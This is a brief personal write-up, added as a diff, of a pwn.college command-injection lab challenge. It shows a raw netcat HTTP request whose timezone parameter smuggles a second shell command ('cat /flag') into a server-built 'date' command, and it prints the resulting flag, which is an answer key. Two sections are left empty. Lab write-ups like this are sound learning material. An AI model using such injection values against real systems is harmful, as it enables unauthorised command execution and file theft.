@@ -1,0 +1,30 @@
+# challenge: CMDi 4
+
+📅 2026-01-22
+📁 web security
+
+---
+
+## ✅ what i did  
+I WAY -> netcat
+-clicked start
+-opened the terminal
+-ran: 'cat /challenge/server'
+found out the enpoint is /activity
+the command is build in the following way: TZ={arg} date
+-ran: '/challenge/server'
+-ran: 'nc -v challenge.localhost 80'
+-typed: 'GET /activity?timezone-val=bro;cat%20%2Fflag; HTTP/1.1'
+        'Host: challenge.localhost'
+-flag popped out
+
+II WAY -> python
+
+
+
+
+## 🧑🏾‍🏫 what this challenge teaches u
+
+
+## 🏁 Flag  
+pwn.college{8UwGQJXpv1SxPzoFhBbVrJL1HXR.QX4gzMzwCO4IDOxEzW}
